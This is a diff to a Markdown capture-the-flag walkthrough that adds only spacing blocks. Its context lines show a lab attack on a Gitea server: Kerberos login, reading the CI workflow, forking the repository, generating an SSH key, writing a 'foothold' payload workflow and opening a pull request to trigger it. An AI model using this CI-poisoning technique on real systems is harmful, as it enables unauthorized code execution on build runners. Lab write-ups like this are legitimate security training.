@@ -255,6 +255,9 @@ curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
 ```bash
 klist
 ```
+<div align="center">
+<br>
+</div>
 
 ### Verify service ticket
 
@@ -262,6 +265,9 @@ klist
 getent hosts gitea.darkzero.ext
 kvno HTTP/gitea.darkzero.ext
 ```
+<div align="center">
+<br>
+</div>
 
 ### SSPI login
 
@@ -271,6 +277,9 @@ curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
   -o /dev/null -w "%{http_code}\n"
 cat /tmp/gitea_cookies.txt
 ```
+<div align="center">
+<br>
+</div>
 
 ### Identity + repos
 
@@ -282,6 +291,9 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
   | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
 ```
+<div align="center">
+<br>
+</div>
 
 ### Repo perms + workflow dir
 
@@ -294,6 +306,9 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
   | python3 -m json.tool
 ```
+<div align="center">
+<br>
+</div>
 
 ### Read workflow
 
@@ -301,6 +316,9 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
 curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
 ```
+<div align="center">
+<br>
+</div>
 
 ### Fork 
 
@@ -318,6 +336,9 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
 ```
 
 Expect `perms: {'admin': True, 'push': True, 'pull': True}`.
+<div align="center">
+<br>
+</div>
 
 ### Generate SSH key
 
@@ -325,6 +346,9 @@ Expect `perms: {'admin': True, 'push': True, 'pull': True}`.
 ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
 cat /tmp/.runner_key.pub
 ```
+<div align="center">
+<br>
+</div>
 
 ### Write payload workflow 
 
@@ -349,6 +373,9 @@ jobs:
 EOF
 cat /tmp/foothold.yml
 ```
+<div align="center">
+<br>
+</div>
 
 ### Upload to fork
 
@@ -362,6 +389,9 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
   | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name','')); print('msg:', d.get('message',''))"
 ```
+<div align="center">
+<br>
+</div>
 
 ### Open PR
 
@@ -375,6 +405,9 @@ PRNUM=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['nu
 SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head']['sha'])")
 echo "PR=$PRNUM SHA=$SHA"
 ```
+<div align="center">
+<br>
+</div>
 
 ### Trigger + collect flag
 
